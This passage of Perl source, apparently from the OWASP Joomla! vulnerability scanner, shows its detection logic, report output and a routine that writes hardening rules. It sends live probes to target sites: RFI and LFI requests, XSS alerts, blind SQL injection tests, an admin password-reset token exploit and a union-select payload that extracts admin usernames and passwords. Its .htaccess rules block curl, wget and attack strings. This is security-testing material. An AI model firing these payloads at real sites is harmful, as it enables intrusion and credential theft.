                print EX "<li><div>Info -> <span  class=\"vuln\">$info</span></div>$jversion<br/>Check: <a target='_blank' href='$url$check'>$url$check</a>&nbsp; <br/>Exploit: <br/><textarea style=\"border:1px #D2D2D2 solid\" cols=\"80\" rows=\"3\" wrap=\"soft\">". encode_entities($exploit)."</textarea><br/>";

            }
            elsif(($args{o}) && $args{o} eq 't')
            {
                print EX '# '.$found."\nInfo -> $info\n$jversion\nCheck: $check\nExploit: $exploit\n";

            }
	    
            ########## [Vulnerability Detection] ######################
            my $isvuln = 0;
            my $vulnans = 'N/A';

            switch($info)
            {
                case (/htaccess\.txt/i)
                {
                    $isvuln = 1;
                }
                case (/Administrator/i)
                {
                    # we further need to detect if it's protected with secret parameter defense
                    if($firewall_found ne '' && $firewall_found =~ /jSecure/i){$isvuln = 0;}
                    elsif(get_url_content($url.$admin_dir.'index.php') =~ /JavaScript\smust\sbe\senabled\sfor/i ){$isvuln = 1;}
                }
                case (/(file include|file inclusion|RFI|LFI)/i)
                {
                    if($exploit =~ m/N\/A/g){last;}

                    $exploit = trim($exploit);
                    my $rfi1 = $ua->get($url.$exploit.'http://test.acunetix.com/acunetix_not_execute?');
                    my $rfi2 = $ua->get($url.$exploit.'http://test.acunetix.com/acunetix_not_execute%00');
                    my $lfi1 = $ua->get($url.$exploit.'noshell.txt?');
                    my $lfi2 = $ua->get($url.$exploit.'noshell.txt%00');


                    if(($rfi1->status_line =~ m/200/g) && ($rfi1->content =~ m/8290a799ef731b633cfdf759a1de7f63/g) )
                    {
                        $isvuln = 1;
                    }
                    elsif(($rfi2->status_line =~ m/200/g) && ($rfi2->content =~ m/8290a799ef731b633cfdf759a1de7f63/g) )
                    {
                        $isvuln = 1;
                    }
                    elsif(($lfi1->status_line =~ m/200/g) && ($lfi1->content =~ m/(Smarty error:|Warning:|unable to read resource:|Failed opening|failed to open stream|No such file or directory)/gi) )
                    {
                        $isvuln = 1;
                    }
                    elsif(($lfi2->status_line =~ m/200/g) && ($lfi2->content =~ m/(Smarty error:|Warning:|unable to read resource:|Failed opening|failed to open stream|No such file or directory)/gi) )
                    {
                        $isvuln = 1;
                    }
                    else { $vulnans= 'No'; }

                } #end /file inclusion/
                case (/file upload/i)
                {
                    if($info =~ /com_pinboard/gi)
                    {
                        $exploit = trim($exploit);
                        my $fileup = get_url_content($url.$exploit);
                        if($fileup =~ /\<form\sname="frmUpload"\senctype="multipart\/form\-data"/gi)
                        {
                            $isvuln = 1;   
                        }
                        else { $vulnans= 'No'; }
                    }
                    
                } # /file upload
                case (/file download/i)
                {
                    if($info =~ /com_rsfiles/gi)
                    {
                        $exploit = trim($exploit);
                        if($ua->get($url.$exploit)->as_string =~ /Content\-Disposition:\sattachment;/gi)
                        {
                            $isvuln = 1;
                        }else { $vulnans= '~Possible. Confirm by fuzzing.'; }
                    }
                    
                } # /file download            
                case (/com_search/i)
                {
                    if($ua->get($url.$exploit)->content =~ /b56a18e0eacdf51aa2a5306b0f533204/gi)
                    {
                        $isvuln = 1;
                    }else { $vulnans= 'No'; }

                }
                case (/Remote\sAdmin\sPassword\sChange/i)
                {
                    my $ua_ra = LWP::UserAgent->new('requests_redirectable'=>['GET','POST']);
                    $ua_ra->agent($uagent);
                    $ua_ra->default_header('Referer'=> "http://$url/");
                    $ua_ra->timeout(30);
                    $ua_ra->cookie_jar({});
                    my $ra_req = $ua_ra->get($url.'/index.php?option=com_user&view=reset&layout=confirm');
                    if ($ra_req->content =~ /Confirm\syour\saccount/gi && $ra_req->content =~ /([0-9a-fA-F]{32})/gi)
                    {
                       my $ra_token = $1;
                       
                       my $ra_pwd_reset = $ua_ra->request(
                                          POST $url.'/index.php?option=com_user&task=confirmreset',
                                          Content => [
                                                token=> "'",
                                                $ra_token => 1
                                                 ],
                                            Referer => $url.'/index.php?option=com_user&view=reset&layout=confirm'
                                            );
                      
                      if($ra_pwd_reset->content =~ /input\sid=\"password2\"\sname=\"password2\"\stype=\"password\"\sclass=\"required\svalidate\-password\"/gi)
                      {
                         $isvuln = 1;
                      }
                      else { $vulnans= 'No'; }
                    }
                    undef $ua_ra;                    

                } # remote admin
                case (/SQL[\s-]Injection/i)
                {
                    if ($info =~ /blind/gi && $info !~ /com_content\sBlind/)
                    {
                        my $blind_sqlin_param = 'N/A';
                        my $blind_sqlin_param_value = 'N/A';
                        my $blind_sqlin_param_pair = 'N/A';
                        
                        if($check =~ /com_jombib/gi)
                        {
                            my $resbsql = $ua->request(
                                                POST $url.'/index.php?option=com_jombib&task=search',
                                                Content => [
                                                      afilter => "a'",
                                                      filter => '',
                                                      order => 'ryear',
                                                      limit  => '25',
                                                      option => 'com_jombib',
                                                      catid => ''
                                                       ]
                                           );        
                            if($resbsql->status_line =~ /200/ && $resbsql->content =~ /Warning\:\sInvalid\sargument\ssupplied\sfor\sforeach/gi)
                            {
                                $isvuln = 1;      
                            }
                            else {$vulnans= 'No';}                               
                        }
                        elsif($exploit =~ /::/g )
                        {
                            my $exploit1 = substr($exploit,0,index($exploit,'::'));
                            my $exploit2 = substr($exploit,length($exploit1)+2,length($exploit));
                            
                            if($check =~ /components\/com\_php/i)
                            {
                                if($target->content =~ m{option=com_php&Itemid=(.*?)&id=(.*?)(&amp;|&|")}ig)
                                {
                                    my $com_php_Itemid = $1;my $com_php_id = $2;
                                    $exploit1 =~ s/Itemid=\[INSERT\]/Itemid=$com_php_Itemid/;
                                    $exploit1 =~ s/id=\[INSERT\]/id=$com_php_id/;
                                    $exploit2 =~ s/Itemid=\[INSERT\]/Itemid=$com_php_Itemid/;
                                    $exploit2 =~ s/id=\[INSERT\]/id=$com_php_id/;                                    
                                }
                            }
                            else
                            {   ## find vulnerable param
                                ## e.g &iid=1+and+1=2
                                if($exploit =~ m{&([a-z-A-Z_]{2,15})\=1\+and\+1\=2}ig)
                                {
                                    $blind_sqlin_param = $1;
                                }
                                ## got iid
                                ## now,find the valid of iid in front page content
                                ## associte it with component name
                                ## must extract from pair of string till vulnerable id
                                ## e.g com_paxxgallery..iid=?
                                ## e.g. option=com_paxxgallery&Itemid=85&gid=7&userid=1&task=view&iid=VALID
                                
                                ## then we compare
                                ## option=com_paxxgallery&Itemid=85&gid=7&userid=1&task=view&iid=VALID+1+and+1=2
                                ## option=com_paxxgallery&Itemid=85&gid=7&userid=1&task=view&iid=VALID+1+and+1=1
                                
                                if($component_onfocus !~ /N\/A/g)
                                {
                                    if($target->content =~ m{option=$component_onfocus(&amp;|&)$blind_sqlin_param=(.*?)(&amp;|&)(.*?)"}ig)
                                    {
                                        $blind_sqlin_param_value = $1;
                                        $blind_sqlin_param_pair = '/index.php?option='.$component_onfocus.'&'.$blind_sqlin_param.'='.$2.'[INSERT]&'.$4;
                                        
                                    }
                                    elsif($target->content =~ m{option=$component_onfocus(.*?)&$blind_sqlin_param=(.*?)(&amp;|&|")}ig)
                                    {
                                        $blind_sqlin_param_value = $2;
                                        $blind_sqlin_param_pair = '/index.php?option='.$component_onfocus.$1.'&'.$blind_sqlin_param.'='.$2.'[INSERT]';
                                    }
                                    elsif($target->content =~ m{option=$component_onfocus(&amp;|&)$blind_sqlin_param=(.*?)"}ig)
                                    {
                                        $blind_sqlin_param_value = $1;
                                        $blind_sqlin_param_pair = '/index.php?option='.$component_onfocus.'&'.$blind_sqlin_param.'='.$2.'[INSERT]';
                                    }                                    
                                }
                                if($blind_sqlin_param_pair !~ /N\/A/)
                                {
                                    
                                    $exploit1 = $blind_sqlin_param_pair;$exploit2 = $blind_sqlin_param_pair;
                                    $exploit1 =~ s/\[INSERT\]/1\+and\+1\=1/;
                                    $exploit2 =~ s/\[INSERT\]/1\+and\+1\=2/;                                    
                                }                                
                                
                            }
                            
                            my $ra1_req = $ua->get($url.$exploit1.'--');
                            my $ra2_req = $ua->get($url.$exploit2.'--');
                            
                            ##print  "\nSize: ",length($ra1_req->content),":", length($ra2_req->content);                                                  
                                                        
                            if ($ra1_req->content !~ /'You\sare\snot\sauthorized\sto\sview\sthis\spage'/gi)
                            {				
                                if ( length($ra1_req->content) eq  length($ra2_req->content) )
                                {
                                    ## confirm again
                                    $exploit1 =~ s/1\+and\+1\=1/1\+1/g;                                    
                                    my $bs1_req = get_url_content($url.$exploit1);
                                    if(is_sqlin($bs1_req) eq 1)
                                    {
                                        $isvuln = 1;                                                                             
                                    }
                                    else {$vulnans= 'No';}                                    
                                }
                                else                                
                                {                                    
                                    $isvuln = 1;
                                }
                            }
                            else
                            {
                               $vulnans= ' No. Access has been denied. May require a valid user account.';
                            }
                            last;
                        }
                    }
                    ## Custom POST Req ##
                    my $ra_req = '';
                    if ($info =~ /view\=archive/gi)
                    {
                        
                        $ra_req = $ua->request(POST "$url",
                                               Content =>
                                               [
                                                 filter => "%' %20union%20select%200,1,concat(username,char(58),password),3,4,5,6,7,8,9,10,11,12,13,14,15%20from%20jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--",
                                                 month => '',
                                                 year => '',
                                                 limit => '', view => 'archive',option=>'com_content'
                                                 
                                               ]
                                               );
                        
                    }
                    ## ##
                    else
                    {
                        ## let's add valid id
                        if( $component_onfocus_Itemid !~ /N\/A/){$exploit=~ s/Itemid=(null|-\d{1,6}|\d{1,6})/Itemid=$component_onfocus_Itemid/;}
                        if($component_onfocus_id !~ /N\/A/){$exploit=~ s/id=(null|-\d{1,6}|\d{1,6})/id=$component_onfocus_id/;}
                        $ra_req = $ua->get($url.$exploit);
                    }
                    
                    if (is_sqlin($ra_req->content) eq 1)
                    {
                        $isvuln = 1;
                    }
                    elsif($exploit =~ /--$/g)
                    {
                        $exploit =~ s/--$/\*\//gi;
        
                        my $ra1_req = $ua->get($url.$exploit);
        
                        if (is_sqlin($ra1_req->content) eq 1)
                        {
                            $isvuln = 1;
                        }                                		    
                        else{$vulnans= 'No';}
        
                    }
                    elsif($exploit =~ /\/\*\*\//g)
                    {
                        $exploit =~ s/\/\*\*\//\+/gi;		
                        my $ra1_req = $ua->get($url.$exploit);		
                        if (is_sqlin($ra1_req->content) eq 1)
                        {
                            $isvuln = 1;
                        }                                		    
                        else{$vulnans= 'No';}
                    }
                    else{$vulnans= 'No';}
                }
                case (/Open\sProxy/i)
                {
                    my $ra_req = $ua->get($url.$exploit);
                    if ($ra_req->content =~ /'success':\s'1'/g)
                    {
                        $isvuln = 1;
                    }
                }
                case (/Traversal/i)
                {		    
                    if($info =~ /X_CMS_LIBRARY_PATH/gi)
                    {
                        my $ra_req = $ua->request(GET $url.$check, X_CMS_LIBRARY_PATH => '../');
            
                        if($ra_req->content =~ /..\/\/banners\//gi)
                        {
                           $isvuln = 1;
                        }else{$vulnans= 'No';}
                    }
                    elsif($info =~ /eXtplorer/gi)
                    {
                        my $xml_ext1 = get_xml_version(do_GET_request($url.$check.'extplorer.xml'));
                        my $xml_ext2 = get_xml_version(do_GET_request($url.$check.'extplorer.j15.xml'));
                        
                        if (($xml_ext1 =~ /(2\.0\.0|1\.)/g) || ($xml_ext2 =~ /(2\.0\.0|1\.)/g) )
                        {   
                            $isvuln = 1;                            
			}else{$vulnans= 'No';}
                    }
                    else
                    {
			my $ra_req = $ua->get($url.$exploit);
			if ( ($ra_req->content =~ /\_NOT\_EXIST/g) || ($ra_req->content =~ /Index\sof/gi) )
			{
			    $isvuln = 1;
			}else {$vulnans= 'No';}
                    }
        
                }
                case (/XSS/)
                {
                    if($info =~ /com_djiceshoutbox/gi)
                    {
                        my $ra_req = $ua->request(POST $url.$exploit,
                                                  'X-Requested-With' => 'XMLHttpRequest',                                                  
                                                   [
                                                    autor => 'test',
                                                    ip => '127.0.0.1',
                                                    content=> '%22%3E%3Cscript%3Ealert(1)%3C/script%3E'
                                                ]
                                           );
                        if ($ra_req->content =~ /><script>alert\(1\);<\/script>/gi or $ra_req->content =~ /<script>alert\(/gi)
                        {
                            $isvuln = 1;
                        }else{$vulnans= 'No';}                        
                    }
                    elsif(($exploit =~ /^\/index\.php/gi) && ($info !~ /xsstream-dm/gi))
                    {
                        my $ra_req = $ua->get($url.$exploit);
        
                        if ($ra_req->content =~ /><script>alert\(1\);<\/script>/gi  or $ra_req->content =~ /<script>alert\(/gi)
                        {
                            $isvuln = 1;
                        }else{$vulnans= 'No';}
                    }

                }
                case (/com_rss\sDOS/)
                {
                    $ua->get("$url/index2.php?option=com_rss&feed=xx9xx");
                    if (check_if_exists("$url/cache/xx9xx.xml") eq 1)
                    {
                        $isvuln = 1;$vulnans = 'Yes';
                    }else{$vulnans= 'No';}	                    
                    
                }

                case(/FCKEditor/)
                {
                    if(get_url_content($url.$check) =~ /FCKeditor\.prototype\.Version\s{1,7}=\s{1,5}\'([\d.]{3,8})\'/)
                    {
                        my $fckv = $1;
                        if(get_bigger_ver($1,'2.6.4.1') eq '2.6.4.1')
                        {
                            $isvuln = 1;
                        }else{$vulnans = 'No';}         
                    }           
                }
                case(/Path Disclosure/)
                {
                    if($exploit =~ /N\/A/ || $exploit !~ /^\//){last;}
                    
                    if(is_path_disclosed(get_url_content($url.$exploit)) eq 1)
                    {
                        $isvuln = 1;}
                    else{$vulnans = 'No';}                 
                }

           } # end switch
            
            ### vuln detection based on version deduced ###
            ### unless security-savvy webmasters modified version probing files
            ### this will give you 99.99% correct vulnerability identification
            if ($info =~ /Core/g && $isvuln eq 0 && $vulnans ne 'No' && $jversion !~ /N\/A/)
            {
                my $jverx = '';
                if($jversion =~ m{(\d.\d{1,2}.\d{1,2})}g)
                {
                    $jverx = $1;                    
                }
               # for each 1.x and 1.5.x

                my $vulnver = $jverx;
                $vulnver =~ s/1\.0\.//g;
                $vulnver =~ s/1\.5\.//g;
              
                $vulnver = int($vulnver);
                if($exact_version_found eq 1)
                {
                    my $ex_ver = $exact_version;
                    $ex_ver =~ s/1\.0\.//g;
                    $ex_ver =~ s/1\.5\.//g;
                    $ex_ver = int($ex_ver);

                   if($vulnver >= $ex_ver)
                   {                      
                        $isvuln = 1;   
                   }
                   else{$vulnans = 'No';}
                }
                else
                {
                    if($lowest_version_max =~ /[0-9]/g &&  $biggest_version_min =~ /[0-9]/g )
                    {
                        $lowest_version_max = int($lowest_version_max);
                        $biggest_version_min = int($biggest_version_min);
                        
                        if( $vulnver >= $biggest_version_min or $vulnver >= $lowest_version_max )                    
                        {
                            $isvuln = 1;    
                        }
                        else{$vulnans = 'No';}
                    }
                }              
                
                
            }            
            $total_found_entries ++;
            if($isvuln eq 1)
            {
                if($vulnans eq 'N/A')
                {
                    print "\nVulnerable? Yes\n";                    
                    if(($args{o}) && $args{o} eq 'h'){ print EX "Vulnerable? <span class=\"rb\">Yes</span><br/>";}
                    elsif(($args{o}) && $args{o} eq 't'){print  EX "Vulnerable? Yes\n\n";}    
                }
                else
                {
                    print "\nVulnerable? $vulnans\n";
                    if(($args{o}) && $args{o} eq 'h' && $vulnans =~ /No/gi){ print EX "Vulnerable? <span class=\"gb\">$vulnans</span><br/>";}
                    if(($args{o}) && $args{o} eq 'h' && $vulnans =~ /N\/A/gi){ print EX "Vulnerable? <span class=\"gray\">$vulnans</span><br/>";}
                    elsif(($args{o}) && $args{o} eq 't'){print  EX "Vulnerable? $vulnans\n\n";}    		    
                }
                if(($args{o}) && $args{o} eq 'h')
                {
                    switch($info)
                    {
                        case (/Generic:/i){$J_GENERIC_HOLES++;}
                        case (/Core:/i){$J_CORE_HOLES ++;}
                        case (/Core/i){$J_CORE_MODULES_HOLES++;}
                        else{$J_3rdParties_HOLES++;}
                    }
                    switch($info)
                    {
                        case (/XSS/i){$J_XSS_HOLES++;}
                        case (/SQL/i){$J_SQLin_HOLES ++;}
                        case (/(file include|file inclusion|RFI|LFI)/i){$J_FI_HOLES++;}
                        case (/(Generic:|Disclosure)/i){$J_INFO_HOLES ++;}
                        case (/Traversal/i){$J_DirTr_HOLES ++;}    
                        else{$J_OTHER_HOLES++;}
                    }                    
                }
                $found_vulnerable++;
            }
            else
            {
                print "\nVulnerable? $vulnans\n";
                    if(($args{o}) && $args{o} eq 'h' && $vulnans =~ /No/gi){ print EX "Vulnerable? <span class=\"gb\">$vulnans</span><br/>";}
                    if(($args{o}) && $args{o} eq 'h' && $vulnans =~ /N\/A/gi){ print EX "Vulnerable? <span class=\"gray\">$vulnans</span><br/>";}
                elsif(($args{o}) && $args{o} eq 't'){print  EX "Vulnerable? $vulnans\n\n";}
            }

            ########## [/Vulnerability Detection] ######################
            print "\n";
            if(($args{o}) && $args{o} eq 'h'){print EX "<input type='button' title='Send selected exploit text/link to the URL box' value=' Send Selection ' onclick='document.getElementById(\"cxp\").style.display=\"\";document.getElementById(\"url\").value=\"$url\"+document.getSelection();'/><br/><br/></li>"; }


        } # end of $resource_found 
    }  # end of length check
    }  # end of length info
    $timer++;
    if(($args{s}) && $args{s} =~ /p/gi)
    {
	print_completed_by_percentage($dbentry,$timer);
    }
    
}
close(JO);

## free
undef(@checked_urls);

if ($found == 0){print "NO vulnerable points!\n";bye;}
else{
    if($found_vulnerable > 1){ print "There are $found_vulnerable vulnerable points in $total_found_entries found entries!\n";}
    else{ print "There is a vulnerable point in $total_found_entries found entries!\n";}
sub get_chart_height
{
    if( $J_GENERIC_HOLES > 1 || $J_CORE_HOLES > 1 || $J_CORE_MODULES_HOLES > 1 || $J_3rdParties_HOLES > 1 ){return 400;}else{return 200;}
}    
   
    if(($args{o}) && $args{o} eq 'h')
    {
        print EX qq{</ol>
<script type="text/javascript">
	
	var myData = new Array(['Generic', $J_GENERIC_HOLES], ['Core', $J_CORE_HOLES], ['Core Modules', $J_CORE_MODULES_HOLES], ['3rd-party Modules',$J_3rdParties_HOLES]);
	var colors = ['#4F4AB3','#CE0000','#CE0000', '#A70000'];
	var vulChart = new JSChart('vuln_graph', 'bar');
	vulChart.setDataArray(myData);	
	vulChart.colorizeBars(colors);
	vulChart.setDataArray(myData);
	vulChart.setShowYValues(false);
        vulChart.setSize(550,}.get_chart_height().qq{);
        vulChart.setTextPaddingTop(0);
	vulChart.setAxisColor('#9D9F9D');	
	vulChart.setAxisNameX('Area');
	vulChart.setAxisNameY('Number');
	vulChart.setAxisNameColor('#655D5D');
	vulChart.setAxisNameFontSize(9);
	vulChart.setAxisValuesColor('#DA352D');	
	vulChart.setAxisValuesFontSize(9);
	vulChart.setAxisValuesDecimals(-0.5);
        vulChart.setAxisPaddingBottom(40);
	vulChart.setBarValuesColor('#DA352D');
	vulChart.setBarValuesFontSize(9);
	vulChart.setBarBorderWidth(1);
	vulChart.setTitle("by Affected Area");
	vulChart.setTitleColor('#696969');
	vulChart.setGrid(false);
	vulChart.setTooltip(['Core', 'Core Application Framework']);
	vulChart.setTooltip(['Generic','Inherently vulnerable by design']);
	vulChart.setTooltip(['Core Modules','Includes Core plugins, core components ..etc.']);
	vulChart.setTooltip(['3rd-party Modules','3rd party related extensions - templates, plugins, components ..etc']);
	vulChart.draw();

	var myData = new Array(}.pie_values().qq{); /*['SQL Injection', $J_SQLin_HOLES], ['XSS', $J_XSS_HOLES], ['File Inclusion', $J_FI_HOLES], ['Information Disclosure', $J_INFO_HOLES],['Directory Traversal', $J_DirTr_HOLES ], ['Others', $J_OTHER_HOLES]*/
	var colors = }.pie_colors().qq{ /*['#CB0A0A',  '#FB4800', '#FF6B28','#FB9900','#923A2E','#CA6558' ];*/
        var vulPie = new JSChart('vuln_pie', 'pie');
	vulPie.setDataArray(myData);
	vulPie.colorizePie(colors);
	vulPie.setPieUnitsFontSize(9);	
	vulPie.setGraphLabelColor("#DA352D");
	vulPie.setTitleColor('#8C8382');
        vulPie.setTextPaddingTop(35);
	vulPie.setPieValuesFontSize(9);
	vulPie.setPieUnitsColor('#DA352D');
	vulPie.setSize(600,440);
        vulPie.setPieUnitsOffset(20);
	vulPie.setTitle("by Vulnerability Type");
	vulPie.setTitleColor('#696969');
	vulPie.draw();
	
</script>        
        };
        print EX '<span id="vuln_point_total" style="display:none;">Total items - <span class="bold">'.$total_found_entries.'</span><br/>Possible Vulnerable
    items - <span class="vuln">'.$found_vulnerable.'</span></span> <a href="http://www.fsf.org/licensing/licenses/gpl.html" target="_blank"><img border="0" src="assets/img/gplv3-logo.png" style="float:right"/></a>
    </div><div style="font-style:italics;font-size:12px;">Generated by <a href="http://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project" target="_blank">OWASP Joomla! Vulnerability Scanner</a> version '.$JOOMSCAN{scanner_version} .' (Database Update: '.$lastupdate.')<br/>[*] Send bugs, suggestions, contributions to <script>document.write("'.$JOOMSCAN{bug_report_email}.'".split("").reverse().join(""));</script><br/></div></body></html>';
        close (EX);
    }
    if (($args{o}) && $args{o} eq 't')
    {
	print EX "\n[!] Vulnerable Point(s) - $found_vulnerable in $total_found_entries found entries \n\nGenerated by OWASP Joomla! Vulnerability Scanner\n[*] Send bugs, suggestions, contributions to ".reverse($JOOMSCAN{bug_report_email})."\n";
	close(EX);}
    if ($args{o}){print "\n~Done saving result as $outfile\n";}
	bye;
}



############# [ROUTINES] ################
sub doc_read
{
    my $f = shift;$f = uc($f);    
    open(RE,'doc/'.$f) || die ("There is no such doc available. Maybe you removed it or use older version of the scanner. Use joomscan.pl download to download new package. Error Message:  $!");
    close(RE);
    if ($^O =~ /Win/) {system("more doc\\".$f);}else{system("more doc/".$f);}    
    exit;
}
sub usage {
    use Env qw(OS);
    
    print_owasp_logo();
    
    
    print STDERR
    qq{
=================================================================
 OWASP Joomla! Vulnerability Scanner v$JOOMSCAN{scanner_version}  
 (c) $JOOMSCAN{author}
 YGN Ethical Hacker Group, Myanmar, http://yehg.net/lab
 Update by: Web-Center, http://web-center.si (2011)
=================================================================
};
sleep(3);
print qq{
 Vulnerability Entries: $dbentry
 Last update: $lastupdate
};

print qq{
 Usage:  $0 -u <string> -x proxy:port
         -u <string>      = joomla Url

         ==Optional==

         -x <string:int>  = proXy to tunnel
         -c <string>      = Cookie (name=value;)
         -g "<string>"    = desired useraGent string(within ") 
         -nv              = No Version fingerprinting check
         -nf              = No Firewall detection check
         -nvf/-nfv        = No version+firewall check
         -pe 		  = Poke version only and Exit
         -ot              = Output to Text file (target-joexploit.txt)
         -oh              = Output to Html file (target-joexploit.htm)
         -vu              = Verbose (output every Url scan)
	 -sp		  = Show completed Percentage
         
 ~Press ENTER key to continue };
 if (<STDIN>)
 { 

 if ($^O =~ /Win/) {system("cls");}else{system("clear");}
 
 print qq{
 Example:  $0 -u victim.com -x localhost:8080
	  
 Check:    $0 check
           - Check if the scanner update is available or not.

 Update:   $0 update
           - Check and update the local database if newer version is available.

 Download: $0 download
           - Download the scanner latest version as a single zip file - joomscan-latest.zip.

 Defense:  $0 defense
           - Give a defensive note.

 About:    $0 story
           - A short story about joomscan.
 
 Read:     $0 read DOCFILE
           DOCFILE - changelog,release_note,readme,credits,faq,owasp_project
   
};
 }
  exit(1);
}
sub story {
    print qq{
A Story about OWASP Joomla! Vulnerability Scanner $JOOMSCAN{scanner_version}
(c) Aung Khant, http://yehg.net/lab
};
    print "\n";sleep(1);print "\n";sleep(1);
    print "Nowadays ...\n";
    sleep(1);
    print "with fruitful results of Opensource ..\n";
    sleep(1);
    print "the use of CMS are more and more prevailing ...\n";
    sleep(1);
    print "integrating into .\t";sleep(1);
    print "embeding into ..\n";sleep(1);
    print "wrapping with a nice site design.\n";sleep(1);print "\n";sleep(1);
    print "\nAttackers take advange of its widespread use\n";sleep(1);
    print "ever victimizing CMS web sites with simplest strings of attack.\n";sleep(1);print "\n";sleep(1);
    print "\nVulnerability scanners targeting or dedicating only to\n";sleep(1);
    print "most popular widespread CMS are demanding among helpless web developers.\n";sleep(1);print "\n";sleep(1);
    print "\nWith this in mind, this JoomScan was c0ded and distributed mainly to\n"; sleep(1);
    print "the world of webmasters, web developers and the like.\n";sleep(1);
    print "\nI researched Joomla! vulnerabilities deeply into the web."; sleep(1);
    print "\nI learnt that a complete Joomla! vulnerability list archive was not found at\n";sleep (1);
    print "even milw0rm.com or secunia.com\n"; sleep (1);print "\n";sleep(1);
    print "I realized unfamous holes ever exist in the wild "; sleep (1);
    print "known only to a few who keep secret.\n";
    sleep(1);print "\n";sleep(1);
    print "\n~Story finished. Have fun!\n";
    bye;
}
sub defense {
  print qq {
Defensive Measure:
===================
0x0. Patch your vulnerable components or modules.
     This can be achieved via upgrading to the latest version or patch files.
     But in some components where development is dead, you should better
     remove those components. Those kind of components are marked as
     "Versions Affected: Any or All".

0x1. Implement php-ids (http://php-ids.org) but it supports only PHP Version 5.2 and above
0x2. Implement mod_security but you may not urge your web server admin to install
0x3. The mod_write security rules provide base-line readily-extensible security measure:
     Add the following code in .htaccess of your root folder:

# Hardened Apache Mod_Rewrite Security Rule
# Last updated Dec 01 2008, check update at http://yehg.net/lab/pr0js/misc/modrewrite-securityrule.php
# Provided by Aung Khant,http://yehg.net/lab
RewriteEngine on
# Allow only GET and POST verbs
RewriteCond %{REQUEST_METHOD} !^(GET|POST)\$ [NC,OR]
# Ban Typical Vulnerability Scanners and others
# Kick out Script Kiddies
RewriteCond %{HTTP_USER_AGENT} ^()\$ [NC,OR] # void of UserAgent
RewriteCond %{HTTP_USER_AGENT} ^(java|curl|wget).* [NC,OR]
RewriteCond %{HTTP_USER_AGENT} ^.*(libwww-perl|curl|wget|python|nikto|wkito|pykto|pikto|scan|acunetix|qualys|fuck|kiss|ass|Morfeus|0wn|hack|h4x|h4x0r).* [NC,OR]
RewriteCond %{HTTP_USER_AGENT} ^.*(winhttp|HTTrack|clshttp|archiver|loader|email|harvest|extract|grab|miner).* [NC,OR]

# Block out common attack strings
# Anti-bypassing with star-slash, slash-star
RewriteCond %{QUERY_STRING} ^.*(/\\\*|\\\*/).* [NC,OR]
# Directory Travarsal & Null Byte Injection
RewriteCond %{QUERY_STRING} (\.\./|\.\.%2f|\.\.%u2215|%u002e%u002e%u2215|%252e%252e%252f|%00|\\00|\\x00|\\u00|%5C00|&#|&#x|%09|%0D%0A) [NC,OR]
# SQL Injection        Probing
RewriteCond %{QUERY_STRING} ^.*(OR%201=1|/select/|/union/|/insert/|/update/|/delete/).* [NC,OR]
# Remote/Local File Inclusion
RewriteCond %{QUERY_STRING} (http:\/\/)*(\?)\$ [NC,OR]
# PHP Version Probing
RewriteCond %{QUERY_STRING} (?=PHP).* [NC,OR]
# XSS Probing
RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
# PHP GLOBALS Overriding
RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [NC,OR]
# PHP REQUEST variable Overriding
RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2})
# Deny access
RewriteRule ^(.*)\$ index.php [F,L]


};
 print "Do you want me to write the above .htaccess code to file? [y/n]\n\n";
 my $ans = <STDIN>;
 chomp($ans);
 if($ans eq 'y')
 {
   open(HT,">.htaccess");
   print HT "# Hardened Apache Mod_Rewrite Security Rule\n# Provided by Aung Khant,http://yehg.net/lab, Check update at http://yehg.net/lab/pr0js/misc/modrewrite-securityrule.php\nRewriteEngine on\n# Allow only GET and POST verbs\nRewriteCond %{REQUEST_METHOD} !^(GET|POST)\$ [NC,OR]\n# Ban Typical Vulnerability Scanners and others\n# Kick out Script Kiddies\nRewriteCond %{HTTP_USER_AGENT} ^()\$ [NC,OR] # void of UserAgent\nRewriteCond %{HTTP_USER_AGENT} ^(java|curl|wget).* [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} ^.*(libwww-perl|curl|wget|python|nikto|wkito|pikto|pykto|scan|acunetix|qualys|fuck|kiss|ass|Morfeus|0wn|hack|h4x|h4x0r).* [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} ^.*(winhttp|HTTrack|clshttp|archiver|loader|email|harvest|extract|grab|miner).* [NC,OR]\n# Block out common attack strings \n# Anti-bypassing with star-slash, slash-star\nRewriteCond %{QUERY_STRING} ^.*(/\\\*|\\\*/).* [NC,OR]\n# Directory Travarsal & Null Byte Injection\nRewriteCond %{QUERY_STRING} (\.\./|\.\.%2f|\.\.%u2215|%u002e%u002e%u2215|%252e%252e%252f|%00|\\00|\\x00|\\u00|%5C00|&#|&#x|%09|%0D%0A) [NC,OR]\n# SQL Injection        Probing\nRewriteCond %{QUERY_STRING} ^.*(OR%201=1|/select/|/union/|/insert/|/update/|/delete/).* [NC,OR]\n# Remote/Local File Inclusion\nRewriteCond %{QUERY_STRING} (http:\/\/)*(\?)\$ [NC,OR]\n# PHP Version Probing\nRewriteCond %{QUERY_STRING} (?=PHP).* [NC,OR]\n# XSS Probing\nRewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]\n# PHP GLOBALS Overriding\nRewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [NC,OR]\n# PHP REQUEST variable Overriding\nRewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2})\n# Deny access\nRewriteRule ^(.*)\$ index.php [F,L]\n";
   close HT;
   print "\n~Done writing to file successfully. have fun!\n";
 }
  bye;
}
sub check {
    print_owasp_logo();
    print qq{
OWASP Joomla! Vulnerability Scanner Program Update
(c) Aung Khant, http://yehg.net/lab
Update by: Web-Center, http://web-center.si

};
        my $file = shift || $0;
        open(FILE, $file) or die "Can't open '$file': $!";
        my $md5 = Digest::MD5->new;
	my $ua = LWP::UserAgent->new('requests_redirectable'=>['HEAD','GET','POST']);				
	$ua->timeout(30);		
        while (<FILE>) {
                $md5->add(encode_utf8($_));
        }
        close(FILE);
        my $local_hash = $md5->hexdigest;
        my $remote_con = $ua->request(GET "$JOOMSCAN{scanner_update_url}");
        if ($remote_con->status_line !~ /200/)
        {
